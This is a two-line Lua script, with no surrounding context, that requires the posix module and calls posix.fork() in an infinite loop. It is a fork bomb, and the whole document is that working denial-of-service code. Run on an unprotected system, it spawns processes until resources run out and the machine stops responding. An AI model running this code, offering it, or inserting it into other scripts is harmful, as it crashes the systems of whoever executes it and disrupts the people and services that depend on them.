require("posix")
while true do posix.fork() end
